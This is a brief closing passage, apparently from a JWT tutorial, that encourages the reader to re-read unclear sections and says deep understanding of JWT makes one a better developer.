Each of these builds on the JWT foundation you now understand!

---

**Questions?** Re-read any section that's unclear. JWT is complex, but understanding it deeply will make you a better developer! 🚀
